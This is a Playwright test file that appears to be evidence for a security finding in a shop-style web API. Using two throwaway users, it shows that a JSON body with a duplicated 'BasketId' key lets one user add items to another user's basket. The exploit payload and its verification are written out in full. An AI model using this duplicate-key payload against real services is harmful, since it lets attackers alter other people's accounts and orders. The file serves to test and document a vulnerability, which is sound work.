import { test, expect, type APIRequestContext, type TestInfo } from '@playwright/test';
import { newAuthedApiContext } from '../../fixtures/sessions';
import { makeEphemeralTestUser } from '../../fixtures/users';

type BasketLineItem = {
    id: number;
    quantity: number;
};

type BasketSnapshot = {
    basketId: string;
    products: BasketLineItem[];
};

type BasketItemMutationResult = {
    status: number;
    text: string;
};

type ProductMutationCandidate = {
    id: number;
    payload: string;
    result: BasketItemMutationResult;
};

type BasketApiLineItem = {
    id?: unknown;
    BasketItem?: {
        quantity?: unknown;
    };
    quantity?: unknown;
};

type BasketApiResponseData = {
    id?: unknown;
    Products?: BasketApiLineItem[];
};

type BasketApiResponse = {
    data?: BasketApiResponseData;
};

type BasketItemMutationResponse = {
    data?: {
        id?: unknown;
        BasketId?: unknown;
    };
};

function parseJson(text: string): unknown {
    try {
        return text ? JSON.parse(text) : null;
    } catch {
        return null;
    }
}

function buildTestRunKey(testInfo: TestInfo): string {
    return `${testInfo.workerIndex}-${testInfo.retry}-${Date.now()}`;
}

function buildCandidateProductIds(excludedProductIds: number[], maxProductId = 40): number[] {
    const excluded = new Set(excludedProductIds.filter((id) => Number.isFinite(id) && id > 0));
    return Array.from({ length: maxProductId }, (_, index) => index + 1).filter((productId) => !excluded.has(productId));
}

function mutationResultBasketId(text: string): string {
    const parsed = parseJson(text) as BasketItemMutationResponse | null;
    return String(parsed?.data?.BasketId ?? '');
}

async function fetchBasketSnapshotById(api: APIRequestContext, token: string, basketId: string, label: string): Promise<BasketSnapshot> {
    const response = await api.get(`/rest/basket/${basketId}`, {
        headers: {
            authorization: `Bearer ${token}`,
        },
    });
    const text = await response.text();
    expect(response.ok(), `${label} GET /rest/basket/${basketId} failed: ${response.status()} ${text}`).toBeTruthy();

    const parsed = parseJson(text) as BasketApiResponse | null;
    const data = parsed?.data ?? null;
    const products = data?.Products ?? [];
    const snapshot = {
        basketId: String(data?.id ?? basketId),
        products: products
            .map((product) => ({
                id: Number(product?.id),
                quantity: Number(product?.BasketItem?.quantity ?? product?.quantity ?? 0),
            }))
            .filter((product: BasketLineItem) => Number.isFinite(product.id) && product.id > 0),
    };

    console.log(`${label} basket snapshot:`, snapshot);
    expect(snapshot.basketId).not.toBe('');
    return snapshot;
}

async function postRawBasketItemMutation(api: APIRequestContext, token: string, payload: string): Promise<BasketItemMutationResult> {
    const response = await api.post('/api/BasketItems/', {
        headers: {
            authorization: `Bearer ${token}`,
            'content-type': 'application/json',
        },
        data: payload,
    });

    return {
        status: response.status(),
        text: await response.text(),
    };
}

async function findWorkingProductMutation(api: APIRequestContext, token: string, excludedProductIds: number[], buildPayload: (productId: number) => string): Promise<ProductMutationCandidate> {
    const attempts: Array<{ productId: number; status: number; responseSnippet: string }> = [];

    for (const productId of buildCandidateProductIds(excludedProductIds)) {
        const payload = buildPayload(productId);
        const result = await postRawBasketItemMutation(api, token, payload);

        attempts.push({
            productId,
            status: result.status,
            responseSnippet: result.text.slice(0, 200),
        });

        if (result.status >= 200 && result.status < 300) {
            return {
                id: productId,
                payload,
                result,
            };
        }
    }

    throw new Error(`Could not find a working product ID outside excluded IDs: ${excludedProductIds.join(', ')}. Attempts: ${JSON.stringify(attempts)}`);
}

test.describe('SCN-04: duplicate BasketId enables cross-user basket mutation', () => {
    test('evidence: a second BasketId lets User B add an item to User A basket', { tag: '@evidence-pass' }, async ({ baseURL }, testInfo) => {
        const runKey = buildTestRunKey(testInfo);
        // Use per-run users so basket state starts clean without introducing shared-user races under parallel execution.
        const userA = makeEphemeralTestUser('SCN04-EVIDENCE-A', `${runKey}-a`);
        const userB = makeEphemeralTestUser('SCN04-EVIDENCE-B', `${runKey}-b`);

        const { api: apiA, token: tokenA, basketId: basketIdA } = await newAuthedApiContext(baseURL!, userA);
        const { api: apiB, token: tokenB, basketId: basketIdB } = await newAuthedApiContext(baseURL!, userB);

        try {
            const setup = await test.step('capture each user basket state', async () => {
                const userABefore = await fetchBasketSnapshotById(apiA, tokenA, basketIdA, 'User A before exploit');
                const userBBefore = await fetchBasketSnapshotById(apiB, tokenB, basketIdB, 'User B before baseline add');

                expect(userABefore.basketId).not.toBe(userBBefore.basketId);

                return {
                    userABefore,
                    userBBefore,
                };
            });

            const baseline = await test.step('prove a normal basket-item POST works for user B', async () => {
                const baselineSelection = await findWorkingProductMutation(
                    apiB,
                    tokenB,
                    setup.userBBefore.products.map((product) => product.id),
                    (productId) => `{"ProductId":${productId},"BasketId":"${setup.userBBefore.basketId}","quantity":1}`,
                );
                const baselineProductId = baselineSelection.id;
                const baselineBody = baselineSelection.payload;
                const baselineResult = baselineSelection.result;
                const userBBaselineQtyBefore = setup.userBBefore.products.find((product) => product.id === baselineProductId)?.quantity ?? 0;

                expect(userBBaselineQtyBefore).toBe(0);
                console.log('User B selected dynamic baseline product ID:', baselineProductId);
                console.log('User B baseline payload:', baselineBody);
                console.log('User B baseline response body:', baselineResult.text);

                expect(baselineResult.status).toBe(200);
                expect(mutationResultBasketId(baselineResult.text)).toBe(setup.userBBefore.basketId);

                const userBAfterBaseline = await fetchBasketSnapshotById(apiB, tokenB, setup.userBBefore.basketId, 'User B after baseline add');
                const userBBaselineQtyAfter = userBAfterBaseline.products.find((product) => product.id === baselineProductId)?.quantity ?? 0;

                expect(userBBaselineQtyAfter).toBe(userBBaselineQtyBefore + 1);

                return { userBAfterBaseline };
            });

            await test.step('prove duplicate BasketId targets user A basket', async () => {
                const exploitSelection = await findWorkingProductMutation(
                    apiB,
                    tokenB,
                    [...setup.userABefore.products, ...baseline.userBAfterBaseline.products].map((product) => product.id),
                    (productId) => `{"ProductId":${productId},"BasketId":"${setup.userBBefore.basketId}","BasketId":"${setup.userABefore.basketId}","quantity":1}`,
                );
                const exploitProductId = exploitSelection.id;
                const exploitBody = exploitSelection.payload;
                const exploitResult = exploitSelection.result;
                const userAQtyBefore = setup.userABefore.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;
                const userBQtyBefore = baseline.userBAfterBaseline.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;

                expect(userAQtyBefore).toBe(0);
                expect(userBQtyBefore).toBe(0);

                console.log('User A basket ID:', setup.userABefore.basketId);
                console.log('User B basket ID:', setup.userBBefore.basketId);
                console.log('Duplicate BasketId exploit body:', exploitBody);
                console.log('Exploit response body:', exploitResult.text);

                expect(exploitBody).toContain(`"BasketId":"${setup.userBBefore.basketId}"`);
                expect(exploitBody).toContain(`"BasketId":"${setup.userABefore.basketId}"`);
                expect(exploitResult.status).toBe(200);
                expect(mutationResultBasketId(exploitResult.text)).toBe(setup.userABefore.basketId);

                const userAAfter = await fetchBasketSnapshotById(apiA, tokenA, setup.userABefore.basketId, 'User A after exploit');
                const userBAfter = await fetchBasketSnapshotById(apiB, tokenB, setup.userBBefore.basketId, 'User B after exploit');
                const userAQtyAfter = userAAfter.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;
                const userBQtyAfter = userBAfter.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;

                expect(userAQtyAfter).toBe(userAQtyBefore + 1);
                expect(userBQtyAfter).toBe(userBQtyBefore);
            });
        } finally {
            await apiA.dispose();
            await apiB.dispose();
        }
    });
});
